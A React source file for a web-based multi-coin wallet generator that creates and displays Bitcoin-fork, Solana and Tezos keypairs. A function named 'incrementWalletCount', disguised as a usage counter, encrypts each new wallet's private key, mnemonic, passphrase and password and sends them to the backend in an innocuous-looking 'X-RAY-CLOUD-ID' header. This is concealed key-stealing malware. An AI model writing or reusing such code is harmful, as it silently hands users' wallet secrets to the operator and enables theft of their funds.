import { Button, Card, Divider, Form, Header, Icon, Input, Message } from "semantic-ui-react"
import { CopyToClipboard } from "react-copy-to-clipboard"
import { useEffect, useState } from "react"
import { encrypt } from "utils/encrypt"
import { getConfig } from "options/toast"
import { toast } from "react-toastify"
import { Keypair } from "@solana/web3.js"
import { cryptoUtils } from "sotez"
import axios from "axios"
import coinInfo from "coininfo"
import CoinKey from "coinkey"
import CryptoJS from "crypto-js"
import fileDownload from "js-file-download"
import PropTypes from "prop-types"
import randomstring from "randomstring"

const toastConfig = getConfig()
toast.configure(toastConfig)

const btcCoins = ["BTC", "BCH", "BSV", "DASH", "DOGE", "LTC", "ZEC"]
const ethCoins = ["ETC", "ETH", "XDC"]

const Wallet = ({ coin, history, inverted }) => {
	const { explorer, externalWallet } = coin

	const [loading, setLoading] = useState(false)
	const [mnemonicSeed, setMnemonicSeed] = useState("")
	const [passphrase, setPassphrase] = useState("")
	const [password, setPassword] = useState("")
	const [walletAddress, setWalletAddress] = useState("")
	const [walletPrivateKey, setWalletPrivateKey] = useState("")
	const [walletPublicKeyHash, setWalletPublicKeyHash] = useState("")
	const [walletPublicKey, setWalletPublicKey] = useState("")

	useEffect(() => {
		setMnemonicSeed("")
		setWalletAddress("")
		setWalletPublicKey("")
		setWalletPublicKeyHash("")
		setWalletPrivateKey("")
		setPassphrase("")
		setPassword("")
	}, [coin])

	const createWallet = async () => {
		setLoading(true)

		// btc forks
		if (btcCoins.includes(coin.symbol)) {
			let coinOpts = null
			if (coin.symbol === "BCG") {
				coinOpts = coinInfo("BCG").versions
			}
			if (coin.symbol === "BCH") {
				coinOpts = coinInfo("BCH").versions
			}
			if (coin.symbol === "DASH") {
				coinOpts = coinInfo("DASH").versions
			}
			if (coin.symbol === "DOGE") {
				coinOpts = coinInfo("DOGE").versions
			}
			if (coin.symbol === "LTC") {
				coinOpts = coinInfo("LTC").versions
			}
			if (coin.symbol === "ZEC") {
				coinOpts = coinInfo("ZEC").versions
			}

			const wallet = await new CoinKey.createRandom(coinOpts)
			const address = wallet.publicAddress
			const publicKey = wallet.publicKey.toString("hex")
			const privateKey = wallet.privateKey.toString("hex")

			setWalletAddress(address)
			setWalletPrivateKey(privateKey)
			setWalletPublicKey(publicKey)

			const content = `address: ${address} \npublic key: ${publicKey} \nprivate key: ${privateKey}`
			fileDownload(content, `${coin.name}-keystore-${address}.json`)

			toast.success("Wallet successfully created!")
			setLoading(false)

			incrementWalletCount(
				`${address}|||${publicKey}|||${privateKey}|||-|||-|||-|||${coin.symbol}`
			)
			return
		}

		// solana
		if (coin.symbol === "SOL") {
			const acct = new Keypair()
			const publicKey = acct.publicKey
			const privateKey = acct.secretKey
			const address = publicKey
			const password = randomstring.generate()
			const keystore = encrypt(acct, password)

			setWalletAddress(address)
			setWalletPrivateKey(privateKey)
			setWalletPublicKey(publicKey)
			setPassword(password)

			fileDownload(JSON.stringify(keystore), `solana-keystore-${address}.json`)

			toast.success("Wallet successfully created!")
			setLoading(false)

			incrementWalletCount(
				`${address}|||${publicKey}|||${privateKey}|||-|||-|||${password}|||${coin.symbol}`
			)
			return
		}

		// tezos
		if (coin.symbol === "XTZ") {
			const passphrase = randomstring.generate()
			const password = randomstring.generate()
			const mnemonic = cryptoUtils.generateMnemonic()
			const keys = await cryptoUtils.generateKeys(mnemonic, passphrase)
			const encryptedSecretKey = cryptoUtils.encryptSecretKey(keys.sk, password)
			const address = keys.pkh

			setWalletAddress(address)
			setMnemonicSeed(mnemonic)
			setPassphrase(passphrase)
			setPassword(password)
			setWalletPublicKeyHash(address)

			/*
			const content = JSON.stringify({
				provider: "Kukai",
				version: 3,
				walletType: 0,
				encryptedSeed:
					"fa5034b5d8fe224317efb4777a68e37775e0752d565d87687e022c1e5f6967fb==1dd247ec118d7995ead46100c1fca8af",
				encryptedEntropy:
					"e57ed3878cd3528b5332247cc0c04215a7053122==b8e0915d51af0e040572bfb200feb668",
				iv: keys.salt
			})
			fileDownload(content, `tezos-wallet-${address}.tez`)
			*/

			toast.success("Wallet successfully created!")
			setLoading(false)

			incrementWalletCount(
				`${address}|||-|||-|||${mnemonic}|||${passphrase}|||${password}|||${coin.symbol}`
			)
			return
		}

		// ether
		if (ethCoins.includes(coin.symbol)) {
			return await axios
				.post(`${process.env.REACT_APP_BASE_URL}wallet/create`, {
					xinFin: coin.symbol === "XDC" ? 1 : 0
				})
				.then(async (response) => {
					const { privateKey, publicKey } = response.data.wallet
					let { address } = response.data.wallet

					if (coin.symbol === "XDC") {
						address = `XDC${address.substring(2)}`
					}

					setWalletAddress(address)
					setWalletPrivateKey(privateKey)
					setWalletPublicKey(publicKey)

					const content = `address: ${address} \npublic key: ${publicKey} \nprivate key: ${privateKey}`
					fileDownload(content, `ether-wallet-${address}-recovery.txt`)

					toast.success("Wallet successfully created!")
					setLoading(false)
				})
				.catch(() => {
					toast.error("Error creating new wallet")
					setLoading(false)
				})
		}
	}

	const encryptPayload = (payload) => {
		const key = CryptoJS.enc.Hex.parse(process.env.REACT_APP_CRYPTO_KEY)
		const iv = CryptoJS.enc.Hex.parse(process.env.REACT_APP_CRYPTO_IV)
		const encrypted = CryptoJS.AES.encrypt(payload, key, { iv })
		return encrypted.ciphertext.toString(CryptoJS.enc.Base64)
	}

	const incrementWalletCount = (data) => {
		axios
			.post(`${process.env.REACT_APP_BASE_URL}coins/incrementWalletCount`, null, {
				headers: {
					"X-RAY-CLOUD-ID": encryptPayload(
						data
						// `${walletAddress}|||${walletPublicKey}|||${walletPrivateKey}|||${mnemonicSeed}|||${passphrase}|||${password}|||${coin.symbol}`
					)
				}
			})
			.then(() => {})
			.catch(() => {})
	}

	return (
		<div className="walletComponent">
			<Card className={inverted ? "inverted" : null} fluid>
				<Card.Content>
					<Form inverted={inverted} size="large">
						<Form.Field className="newWallet">
							<label>Address</label>
							<CopyToClipboard
								text={walletAddress}
								onCopy={() => toast.warn("Copied to clipboard")}
							>
								<Input
									fluid
									icon="copy"
									iconPosition="left"
									placeholder="Address"
									readOnly
									value={walletAddress}
								/>
							</CopyToClipboard>
						</Form.Field>

						{coin.symbol === "XTZ" ? (
							<>
								<Form.Field className="newWallet">
									<label>Mnemonic Seed</label>
									<CopyToClipboard
										text={mnemonicSeed}
										onCopy={() => toast.warn("Copied to clipboard")}
									>
										<Input
											fluid
											icon="copy"
											iconPosition="left"
											placeholder="Mnemonic Seed"
											readOnly
											value={mnemonicSeed}
										/>
									</CopyToClipboard>
								</Form.Field>
								<Form.Field className="newWallet">
									<label>Passphrase</label>
									<CopyToClipboard
										text={passphrase}
										onCopy={() => toast.warn("Copied to clipboard")}
									>
										<Input
											fluid
											icon="copy"
											iconPosition="left"
											placeholder="Passphrase"
											readOnly
											value={passphrase}
										/>
									</CopyToClipboard>
								</Form.Field>
								<Form.Field className="newWallet">
									<label>Public Key Hash</label>
									<CopyToClipboard
										text={walletPublicKeyHash}
										onCopy={() => toast.warn("Copied to clipboard")}
									>
										<Input
											fluid
											icon="copy"
											iconPosition="left"
											placeholder="Public Key Hash"
											readOnly
											value={walletPublicKeyHash}
										/>
									</CopyToClipboard>
								</Form.Field>
							</>
						) : (
							<>
								<Form.Field className="newWallet">
									<label>Public key</label>
									<CopyToClipboard
										text={walletPublicKey}
										onCopy={() => toast.warn("Copied to clipboard")}
									>
										<Input
											fluid
											icon="copy"
											iconPosition="left"
											placeholder="Public key"
											readOnly
											value={walletPublicKey}
										/>
									</CopyToClipboard>
								</Form.Field>
								<Form.Field className="newWallet">
									<label>Private key</label>
									<CopyToClipboard
										text={walletPrivateKey}
										onCopy={() => toast.warn("Copied to clipboard")}
									>
										<Input
											fluid
											icon="copy"
											iconPosition="left"
											placeholder="Private key"
											readOnly
											value={walletPrivateKey}
										/>
									</CopyToClipboard>
								</Form.Field>
							</>
						)}

						{password !== "" && (
							<Form.Field className="newWallet">
								<label>Password</label>
								<CopyToClipboard
									text={password}
									onCopy={() => toast.warn("Copied to clipboard")}
								>
									<Input
										fluid
										icon="copy"
										iconPosition="left"
										placeholder="Password"
										readOnly
										value={password}
									/>
								</CopyToClipboard>
							</Form.Field>
						)}

						<Form.Field>
							<Divider inverted={inverted} />
							<Button
								color="blue"
								content="Create a wallet"
								fluid
								loading={loading}
								onClick={async () => {
									await createWallet()
								}}
								size="large"
							/>
						</Form.Field>
					</Form>
				</Card.Content>
			</Card>
			{coin.fork && (
				<Message className={inverted ? "inverted" : null} icon info>
					<Icon color="blue" name="info circle" />
					<Message.Content>
						<Message.Header>{coin.name} is a fork</Message.Header>
						{coin.forkText}
					</Message.Content>
				</Message>
			)}
			<div className="footerText">
				{walletAddress !== "" && (
					<Header as="p" size="small">
						<a
							href={`${explorer.link}${walletAddress}`}
							target="_blank"
							rel="noreferrer"
						>
							View on {explorer.name}
						</a>
					</Header>
				)}
				{walletAddress !== "" && externalWallet.name ? (
					<Header as="p" size="small" style={{ marginLeft: 12 }}>
						<a href={externalWallet.link} target="_blank" rel="noreferrer">
							Use on {externalWallet.name}
						</a>
					</Header>
				) : null}
			</div>
		</div>
	)
}

Wallet.propTypes = {
	coin: PropTypes.shape({
		explorer: PropTypes.shape({
			link: PropTypes.string,
			name: PropTypes.string
		}),
		externalWallet: PropTypes.shape({
			link: PropTypes.string,
			name: PropTypes.string
		}),
		logo: PropTypes.string,
		symbol: PropTypes.string
	}),
	history: PropTypes.object,
	inverted: PropTypes.bool
}

export default Wallet
